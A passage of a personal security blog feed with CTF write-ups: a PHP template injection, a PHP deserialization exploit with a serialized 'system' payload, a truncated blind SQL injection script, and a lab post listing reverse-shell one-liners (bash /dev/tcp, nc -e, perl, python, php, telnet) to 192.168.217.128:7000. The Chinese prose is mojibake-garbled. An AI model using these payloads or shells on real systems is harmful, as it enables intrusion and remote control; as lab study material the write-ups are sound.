æ‰§è¡Œï¼Œè¿›è€Œåˆ©ç”¨è¿™ä¸ªå‡½æ•°çš„eval</p><p>è¿˜å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘½ä»¤æ‰§è¡Œè€Œä¸ç”¨eval</p><pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;</code></pre><p>æ‹¼æ¥çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot;&gt;&lt;a href=&quot;#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot;&gt;&lt;/a&gt;[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="http://haorical.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>20210927</title>
    <link href="http://haorical.xyz/posts/5106ce6b/"/>
    <id>http://haorical.xyz/posts/5106ce6b/</id>
    <published>2021-09-27T14:21:59.000Z</published>
    <updated>2021-09-27T16:56:58.650Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote><p>phpæ¨¡æ¿æ³¨å…¥</p></blockquote><p>phpå­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œä¸ä»…pythonæœ‰ï¼Œphpä¹Ÿæœ‰</p><p>è¯¥é¢˜æ˜¯é€šè¿‡xffçš„æ–¹å¼è·å–çš„æœ¬æœºipï¼Œåœ¨è¿™é‡Œæµ‹è¯•æ˜¯å¦æœ‰æ¨¡æ¿æ³¨å…¥ï¼Œæµ‹è¯•49ï¼Œèƒ½æ‰§è¡Œè¯´æ˜å­˜åœ¨ï¼Œç„¶åcat /flagå°±è¡Œï¼Œæœ¬æ¥æ‰“ç®—åå¼¹ä¸ªshellç©ç©å‘¢ï¼Œç»“æœä¸€ä¸ªéƒ½ä¸èƒ½ç”¨ã€‚</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><blockquote><p>ååºåˆ—åŒ–ç»•è¿‡</p></blockquote><p>è¿™é¢˜æœ¬æ¥ä¹Ÿæƒ³åå¼¹ä¸ªshellï¼Œä¹Ÿæ˜¯å¼¹äº†åŠå¤©æ²¡è°ˆè¿‡æ¥ã€‚ã€‚</p><p>ç›´æ¥cat flagä¹Ÿæ²¡æœ‰ï¼Œåªèƒ½findå‘½ä»¤äº†</p><p>å…ˆæŠ“åŒ…ï¼Œæ€€ç–‘å¯èƒ½æœ‰call_user_funcï¼Œéšä¾¿è¯•äº†å‡ ä¸ªéƒ½è¢«è¿‡æ»¤äº†ï¼Œfile_get_contentsæ²¡è¢«ç¦ï¼Œè·å–index.phpæºç ï¼Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œå‰©äº†ä¸ªfile_get_contentsæ²¡è¢«ç¦</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™å‡ºexp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># ç¬¬ä¸€éƒ¨</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># ç¬¬äºŒéƒ¨</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°pyload: </p><pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-The-mystery-of-ip&quot;&gt;&lt;a href=&quot;#BJDCTF2020-The-mystery-of-ip&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]The mystery of ip&quot;&gt;&lt;/a&gt;[</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://haorical.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="SSTI" scheme="http://haorical.xyz/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>åå¼¹shellæµ‹è¯•</title>
    <link href="http://haorical.xyz/posts/9f6aba72/"/>
    <id>http://haorical.xyz/posts/9f6aba72/</id>
    <published>2021-09-27T06:38:26.000Z</published>
    <updated>2021-09-27T08:11:47.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p>é¶æœºä¸ºä¸€å°ubuntuï¼Œæµ‹è¯•æœºä¸ºkaliï¼Œä¸¤è€…ä½äºåŒä¸€ç½‘æ®µå†…</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h3><p>å½“Linuxå¯åŠ¨çš„æ—¶å€™ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li>æ ‡å‡†è¾“å…¥standard input 0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰</li><li>æ ‡å‡†è¾“å‡ºstandard output 1ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li><li>é”™è¯¯è¾“å‡ºï¼šerror output 2ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li></ul><p>æ–‡ä»¶æ‰€æœ‰è¾“å…¥è¾“å‡ºéƒ½æ˜¯ç”±è¯¥è¿›ç¨‹æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶çš„ã€‚ï¼ˆLinuxä¸€åˆ‡çš†æ–‡ä»¶ï¼Œå°±è¿é”®ç›˜æ˜¾ç¤ºå™¨è®¾å¤‡éƒ½æ˜¯æ–‡ä»¶ï¼Œå› æ­¤ä»–ä»¬çš„è¾“å…¥è¾“å‡ºä¹Ÿæ˜¯ç”±æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶ï¼‰</p><p>ä¸€æ¡å‘½ä»¤æ‰§è¡Œä»¥å‰å…ˆä¼šæŒ‰ç…§é»˜è®¤çš„æƒ…å†µè¿›è¡Œç»‘å®šï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€è¯´çš„ 0,1,2ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬æœ‰æ—¶å€™éœ€è¦è®©è¾“å‡ºä¸æ˜¾ç¤ºåœ¨æ˜¾ç¤ºå™¨ä¸Šï¼Œè€Œæ˜¯è¾“å‡ºåˆ°æ–‡ä»¶æˆ–è€…å…¶ä»–è®¾å¤‡ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦é‡å®šå‘ã€‚</p><h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><ul><li>è¾“å…¥é‡å®šå‘ &lt; &lt;&lt;</li><li>è¾“å‡ºé‡å®šå‘ &gt; &gt;&gt;</li></ul><ol><li><p>bash åœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæ£€æŸ¥å‘½ä»¤ä¸­å­˜ä¸å­˜åœ¨é‡å®šå‘çš„ç¬¦å·ï¼Œå¦‚æœå­˜åœ¨é‚£ä¹ˆé¦–å…ˆå°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ï¼Œç„¶ååœ¨æŠŠé‡å®šå‘å»æ‰ï¼Œæ‰§è¡ŒæŒ‡ä»¤</p></li><li><p>å¦‚æœæŒ‡ä»¤ä¸­å­˜åœ¨å¤šä¸ªé‡å®šå‘ï¼Œé‚£ä¹ˆä¸è¦éšä¾¿æ”¹å˜é¡ºåºï¼Œå› ä¸ºé‡å®šå‘æ˜¯ä»å·¦å‘å³è§£æçš„ï¼Œæ”¹å˜é¡ºåºå¯èƒ½ä¼šå¸¦æ¥å®Œå…¨ä¸åŒçš„ç»“æœï¼ˆè¿™ä¸€ç‚¹æˆ‘ä»¬åé¢ä¼šå±•ç¤ºï¼‰</p></li><li><p><strong>&lt; æ˜¯å¯¹æ ‡å‡†è¾“å…¥ 0 é‡å®šå‘ ï¼Œ&gt; æ˜¯å¯¹æ ‡å‡†è¾“å‡º 1 é‡å®šå‘</strong></p></li><li><p>é‡å®šå‘å°±æ˜¯é’ˆå¯¹æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œ</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¾“å…¥é‡å®šå‘:</span></span><br><span class="line">[n]&lt; [file] <span class="comment">#nä¸ºæ–‡ä»¶æè¿°ç¬¦ é»˜è®¤ä¸º0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºé‡å®šå‘ï¼š</span></span><br><span class="line">[n]&gt; [file] <span class="comment">#é»˜è®¤ä¸º1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘ï¼š</span></span><br><span class="line">&amp;&gt; [file] &gt;&amp; [file] ç­‰ä»·äº &gt; [file] 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>é¶æœº</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.217.128/7000 0&gt;&amp;1</code></pre><p>-i æ‰“å¼€ä¸€ä¸ªå¯äº¤äº’çš„shellï¼Œ&gt;&amp; å°†æ··åˆè¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼ˆè¿™é‡Œçš„&amp;æ˜¯æ··åˆè¾“å‡ºåŒ…æ‹¬æ ‡å‡†å’Œé”™è¯¯çš„æ„æ€ï¼‰ï¼Œ0&gt;&amp;1 å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ–‡ä»¶ï¼ˆä¸å‰è€…ä¸åŒï¼Œè¿™é‡Œçš„ &amp; æ˜¯ä¸ºäº†åŒºåˆ†æ–‡ä»¶æè¿°ç¬¦å’Œæ•°å­—åçš„æ–‡ä»¶ï¼‰ï¼Œå…¶ä¸­ /dev/tcp/192.168.217.128/7000 å°±ç›¸å½“äºæ˜¯ä¸€ä¸ªæ–‡ä»¶</p><p>kali</p><pre><code>nc -lvp 7000</code></pre><p>ncç›‘å¬7000ç«¯å£</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.217.128/7000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></pre><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre><code>nc -e /bin/sh 192.168.217.128 7000</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre><code>perl -e &#39;use Socket;$i=&quot;192.168.217.128&quot;;$p=7000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.217.128&quot;,7000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.217.128&quot;,7000);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><pre><code>mknod backpipe p &amp;&amp; telnet 192.168.217.128 7000 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html">https://www.cnblogs.com/iouwenbo/p/11277453.html</a></p><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‡†å¤‡&quot;&gt;&lt;a href=&quot;#å‡†å¤‡&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡&quot;&gt;&lt;/a&gt;å‡†å¤‡&lt;/h2&gt;&lt;p&gt;é¶æœºä¸ºä¸€å°ubuntuï¼Œæµ‹è¯•æœºä¸ºkaliï¼Œä¸¤è€…ä½äºåŒä¸€ç½‘æ®µå†…&lt;/p&gt;
&lt;h2 id=&quot;åŸç†&quot;&gt;&lt;a href=&quot;#åŸç†&quot; class=&quot;he</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="æµ‹è¯•å·¥å…·" scheme="http://haorical.xyz/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢ä¸»ç«™ç‚¹å…³é—­é€šçŸ¥</title>
    <link href="http://haorical.xyz/posts/9fc12a02/"/>
    <id>http://haorical.xyz/posts/9fc12a02/</id>
    <published>2021-09-26T18:13:29.000Z</published>
    <updated>2021-09-26T18:25:47.033Z</updated>
    
    <content type="html"><![CDATA[<p>å—æŸç§ç¥ç§˜åŠ›é‡çš„å½±å“ï¼Œä»æ˜¨å¤©æ—©ä¸Šå¼€å§‹ï¼ŒæœåŠ¡å™¨cpuä¸€ç›´çˆ†çº¢ï¼Œåˆšæ’é™¤äº†ä¸€ä¸‹æ˜¯gitçš„é—®é¢˜ï¼Œé‡å¯ä¹Ÿæ²¡ç”¨</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p><p>killæ‰gitçš„è¿›ç¨‹åï¼Œåªè¦æˆ‘é‡æ–°pushï¼Œcpuåˆä¼šé‡æ–°æ‹‰åˆ°100ï¼ŒåŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå¯¼è‡´åšå®¢æ— æ³•æ¨é€åˆ°æœåŠ¡å™¨ï¼Œç°åœ¨å·²å¯ç”¨githubä¸Šçš„å¤‡ç”¨åšå®¢ï¼Œå·²å°†åŸŸå<a href="https://haorical.xyz/">https://haorical.xyz</a>è§£æåˆ°ä½äºgithubä¸Šçš„åšå®¢åœ°å€<a href="https://haorical.github.io/">https://haorical.github.io</a>ï¼Œå¯èƒ½ä¼šé€ æˆè®¿é—®é€Ÿåº¦å˜æ…¢ç­‰é—®é¢˜ã€‚</p><p>æœåŠ¡å™¨é—®é¢˜æ˜å¤©æˆ‘å†ç ”ç©¶ä¸€ä¸‹ï¼Œç°åœ¨æœåŠ¡å™¨å·²ç»åœäº†ï¼ŒåŒ…æ‹¬è¿è¡Œçš„å…¶ä»–ç½‘ç«™ä»¥åŠapiæ¥å£æš‚æ—¶å…¨éƒ¨æ— æ³•ä½¿ç”¨ï¼Œæˆ‘ä¼šå°½å¿«æ¢å¤ã€‚</p><p><strong>å“ï¼é©¬è€å¸ˆï¼Œå‘ç”Ÿä»€ä¹ˆäº‹äº†ï¼Ÿ</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å—æŸç§ç¥ç§˜åŠ›é‡çš„å½±å“ï¼Œä»æ˜¨å¤©æ—©ä¸Šå¼€å§‹ï¼ŒæœåŠ¡å™¨cpuä¸€ç›´çˆ†çº¢ï¼Œåˆšæ’é™¤äº†ä¸€ä¸‹æ˜¯gitçš„é—®é¢˜ï¼Œé‡å¯ä¹Ÿæ²¡ç”¨&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/2021092701262</summary>
      
    
    
    
    <category term="éšç¬”" scheme="http://haorical.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>20210926</title>
    <link href="http://haorical.xyz/posts/2601fefd/"/>
    <id>http://haorical.xyz/posts/2601fefd/</id>
    <published>2021-09-26T15:58:03.000Z</published>
    <updated>2021-09-27T00:54:42.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>å…ˆè´´ä¸€ç¯‡æ–‡ç« ï¼Œè®²çš„æ¯”è¾ƒå¥½ï¼Œå…³äºmysqlæ³¨å…¥çš„</p><p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p><p>è¿™ä¸ªé¢˜å‘¢ï¼Œæœ€ç»ˆå°±æ˜¯ç›´æ¥è·‘è„šæœ¬</p><p>æµ‹è¯•1ï¼Œ2ä¼šè¿”å›ä¸¤ä¸ªè¯­å¥ï¼Œæµ‹è¯•2-1è¿”å›1çš„è¯­å¥ï¼Œæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œç„¶åunionå‘ç°æœ‰waf,fuzzè·å–è¿‡æ»¤çš„å­—æ®µï¼Œè¿™é‡Œå­¦ä¼šäº†æ€ä¹ˆç”¨bpè¿›è¡Œfuzzï¼Œä»¥åŠfuzzdbè¿™ä¸ªä»“åº“</p><p>æ­£ç¡®çš„æ–¹æ³•æ˜¯å…ˆåˆ©ç”¨ifè¯­å¥ï¼Œå®ç°å¸ƒå°”æ³¨å…¥ã€‚åˆ©ç”¨æ‹¬å·æ¥ç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ã€‚ç»è¿‡æµ‹è¯•ï¼Œç”¨TABæˆ–è€…%09%0a%0dä¹‹ç±»è¿™æ ·çš„ç»•è¿‡æ–¹å¼ä¹Ÿå¯ä»¥æˆåŠŸç»•è¿‡ç©ºæ ¼ã€‚</p><p>sqlçš„ä¸‰ç›®è¿ç®—</p><pre><code>if( è¡¨è¾¾å¼1ï¼Œè¡¨è¾¾å¼2ï¼Œè¡¨è¾¾å¼3)</code></pre><p>å¦‚æœè¡¨è¾¾å¼1æ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆæ‰§è¡Œè¡¨è¾¾å¼2ï¼Œå¦åˆ™æ‰§è¡Œè¡¨è¾¾å¼3</p><p>æˆ–è€…å¼‚æˆ–æ³¨å…¥</p><pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code></pre><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span 